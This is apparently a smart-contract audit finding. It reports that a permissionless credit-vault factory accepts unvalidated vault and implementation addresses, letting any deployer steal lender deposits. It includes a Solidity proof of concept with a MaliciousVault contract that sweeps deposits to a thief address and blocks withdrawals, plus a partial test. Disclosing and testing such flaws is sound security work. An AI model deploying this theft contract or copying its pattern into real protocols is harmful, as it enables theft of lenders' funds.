### Title
Unverified external vault/implementations in permissionless factory let an unprivileged deployer launch a factory-endorsed credit vault that steals lender deposits - (File: contracts/IdleCreditVaultFactory.sol)

### Summary
`IdleCreditVaultFactory.deployCreditVault` and `deployRevolvingCreditVault` are callable by any EOA and accept caller-supplied implementation addresses (`cvParams.implementation`, `strategyData.implementation`, `programmableBorrowerParams.implementation`) and, for the revolving variant, an arbitrary ERC4626 `vault` where all lender funds are parked. No provenance check (allowlist of implementations, or a registry of approved vaults) is performed — the only validations are minimum fees and non-zero manager. This is the idle-tranches analog of the Napier "unauthorised/malicious base pool" issue: the factory emits a legitimate-looking `CreditVaultDeployed` event for a vault wired to an attacker-controlled sink.

### Finding Description
In `deployRevolvingCreditVault`, `programmableBorrowerParams.vault` flows verbatim into `ProgrammableBorrower.initialize` [1](#0-0) . The only check on `vault` inside `initialize` is `IERC4626(_vault).asset() == underlyingToken`, plus non-zero addresses [2](#0-1) . A malicious ERC4626 satisfies this trivially.

Once lenders deposit into the credit vault and the manager starts an epoch, `onStartEpoch` calls `_depositToVault(underlyingToken.balanceOf(address(this)))`, transferring the entire pool balance into the attacker vault [3](#0-2) [4](#0-3) . `onStopEpoch` catches vault withdrawal failures only via `StopEpochVaultLiquidityUnavailable` / default paths, which cannot recover funds [5](#0-4) .

No guard prevents this: `_checkMinimumFees` only enforces fee floors [6](#0-5) , `deployRevolvingCreditVault` has no access control or vault validation [7](#0-6) , and `_deployProxy` trusts whatever `implementation` the caller passes [8](#0-7) .

### Impact Explanation
100% of lender principal parked in the programmable-borrower vault sleeve can be permanently frozen or stolen by the malicious vault contract (it can simply keep the deposited underlying or revert on `withdraw`). Deposit timing (buffer → `startEpoch`) makes the theft atomic with the first epoch. The `CreditVaultDeployed` event emitted by the *official* factory gives the malicious deployment the same provenance signal as legitimate vaults, which is precisely the harm class of the original report.

### Likelihood Explanation
The attacker needs no privileged role — they only call `deployRevolvingCreditVault` with a malicious `vault` (they may even set honest external manager/borrower addresses, so the "honest roles" assumption is preserved; the theft is executed by the vault contract itself, not by manager/borrower/owner). The constraint is that lenders must deposit into the attacker-deployed vault, i.e., the attack requires attracting victims — the same phishing-adjacent precondition as the Napier issue, rated Medium there. The vault also passes `KeyringIdleWhitelist` wiring if desired, so nothing distinguishes it on-chain from a real deployment.

### Recommendation
In `IdleCreditVaultFactory`, maintain a treasury-controlled allowlist of permitted implementation contracts (CDO, strategy, queue, write-off escrow, programmable borrower) and permitted vault addresses (or a vault registry), and revert if caller-supplied addresses are not allowlisted. Alternatively, have the factory deploy only hardcoded implementation references and select the programmable vault from a curated set.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;
import "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IdleCreditVaultFactory} from "../../contracts/IdleCreditVaultFactory.sol";
import {IdleCDOEpochVariant} from "../../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../../contracts/strategies/idle/IdleCreditVault.sol";
import {ProgrammableBorrower} from "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract MaliciousVault {
    address public assetToken;
    address public thief;
    constructor(address _asset, address _thief) { assetToken = _asset; thief = _thief; }
    function asset() external view returns (address) { return assetToken; }
    function deposit(uint256 assets, address) external returns (uint256) {
        // pull funds, then sweep to thief
        IERC20(assetToken).transferFrom(msg.sender, address(this), assets);
        IERC20(assetToken).transfer(thief, assets); // or retain & refuse withdrawals
        return assets;
    }
    function withdraw(uint256, address, address) external returns (uint256) { revert("nope"); }
    function redeem(uint256, address, address) external returns (uint256) { revert("nope"); }
    function convertToAssets(uint256 s) external pure returns (uint256) { return s; }
    function balanceOf(address) external view returns (uint256) {
        return IERC20(assetToken).balanceOf(address(this));
    }
    function maxWithdraw(address) external pure returns (uint256) { return type(uint256).max; }
}

contract MaliciousVaultPoC is Test {
    function testFactoryDeploysVaultWithMaliciousPool() external {
        // Setup: deploy factory, underlying mock, implementations (as in IdleCreditVaultFactory.t.sol)
        IdleCreditVaultFactory factory = _deployFactory(); // treasury=owner, proxyAdmin
        MockERC20 underlying = new MockERC20();
        MaliciousVault evilVault = new MaliciousVault(address(underlying), attacker);

        // Attacker (unprivileged EOA) deploys revolving credit vault through the OFFICIAL factory
        vm.prank(attacker);
        factory.deployRevolvingCreditVault(
            cvParams,                       // real IdleCDOEpochVariant impl, real underlying
            strategyData,                   // real IdleCreditVault impl, honest manager
            ProgrammableBorrowerParams({
                implementation: address(new ProgrammableBorrower()), // real impl
                vault: address(evilVault),                           // malicious base pool
                borrower: honestBorrower,
                borrowerApr: 0
            }),
            ancillaryParams
        );
        // -> CreditVaultDeployed emitted by official factory; no revert.

        // Victim lender deposits 1_000_000 underlying into the AA tranche.
        // Honest manager calls startEpoch -> ProgrammableBorrower.onStartEpoch ->
        // _depositToVault(entire balance) -> evilVault.deposit sweeps 1_000_000 to attacker.
        // stopEpoch later reverts/defaults; lender principal is unrecoverable.
    }
}
```

Key assertions: `deployRevolvingCreditVault` succeeds with `vault = evilVault` (passes the `asset()` check), `evilVault.balanceOf(programmableBorrower) == 1_000_000e6` after `startEpoch`, and `attacker` balance increased by the full deposit — demonstrating direct theft of lender funds via an unvalidated "base pool".
